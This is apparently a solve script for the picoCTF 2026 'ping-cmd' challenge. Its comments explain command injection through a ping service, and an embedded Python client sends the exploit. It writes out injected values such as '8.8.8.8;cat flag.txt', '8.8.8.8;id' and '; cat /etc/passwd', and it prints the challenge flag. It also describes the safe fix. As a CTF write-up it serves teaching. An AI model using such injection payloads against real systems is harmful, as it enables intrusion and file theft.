#!/usr/bin/env bash
set -euo pipefail

# Challenge Name: ping-cmd
# Category: General Skills
# Difficulty: Medium
# Event: picoCTF 2026
# Author: YAHAYA MEDDY
#
# Description:
# "Can you make the server reveal its secrets? It seems to be able to ping
# Google DNS, but what happens if you get a little creative with your input?"
#
# Given information from the challenge:
# Remote service: nc mysterious-sea.picoctf.net 64997
# Prompt message:
# "Enter an IP address to ping! (We have tight security because we only allow
# '8.8.8.8')"
#
# Core lesson:
# This challenge is about command injection.
# The application pretends to only accept one safe IP address, but it still
# passes user input into a shell command in an unsafe way.
#
# Real-world analogy:
# Imagine a web admin panel that runs:
#   ping <user_input>
# on the server after "validating" the input with a weak string check.
#
# If the developer only checks whether the input starts with something safe,
# but still lets shell metacharacters through, an attacker can append a second
# command such as:
#   ; cat /etc/passwd
#
# The first command looks legitimate, but the shell sees the semicolon and runs
# both commands.
#
# High-level attack plan:
# 1. Send the allowed value 8.8.8.8 to observe normal behavior.
# 2. Test whether shell separators like ;, &&, or | are interpreted.
# 3. Confirm command injection by running id.
# 4. Read flag.txt using the same injection primitive.
#
# Step 1: Check the normal behavior.
# Manual command:
# printf '8.8.8.8\n' | nc mysterious-sea.picoctf.net 64997
#
# Reason:
# This shows the service really runs ping and returns the output. Establishing a
# baseline first is useful because it tells us what "normal" looks like before
# we start testing abuse cases.
#
# Step 2: Test whether the input is passed to a shell.
# Manual command:
# printf '8.8.8.8;id\n' | nc mysterious-sea.picoctf.net 64997
#
# Reason:
# The semicolon is a shell command separator.
# If the backend runs something like:
#   system("ping -c 2 " + user_input)
# then:
#   8.8.8.8;id
# becomes:
#   ping -c 2 8.8.8.8; id
#
# and the server runs both commands.
#
# In the solved instance, the output includes:
# uid=1000(ctf-player) gid=1000(ctf-player) groups=1000(ctf-player)
#
# That proves we have command injection.
#
# Step 3: Use the same primitive to read the flag.
# Manual command:
# printf '8.8.8.8;cat flag.txt\n' | nc mysterious-sea.picoctf.net 64997
#
# Reason:
# Once we know arbitrary shell commands are executing, the shortest path to the
# flag is to read the file directly. The original ping command still runs, but
# the shell then executes:
#   cat flag.txt
#
# and prints the flag in the same response.
#
# Real-world security concept:
# Command injection is dangerous because it turns a simple feature such as
# "diagnose network connectivity" into remote code execution. The safe fix is:
# - avoid shell=True / system() when possible
# - pass arguments directly to an API like execve/subprocess.run([...])
# - strictly validate input as data, not shell syntax
#
# Flag obtained:
# picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_252214ae}

host="${1:-mysterious-sea.picoctf.net}"
port="${2:-64997}"

python3 - "$host" "$port" <<'PY'
import re
import socket
import sys

host = sys.argv[1]
port = int(sys.argv[2])
payload = b"8.8.8.8;cat flag.txt\n"

with socket.create_connection((host, port), timeout=15) as s:
    _ = s.recv(4096)
    s.sendall(payload)

    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk

match = re.search(rb"picoCTF\{[^}]+\}", data)
if not match:
    raise SystemExit(data.decode("latin1", "replace"))

print(match.group(0).decode())
PY
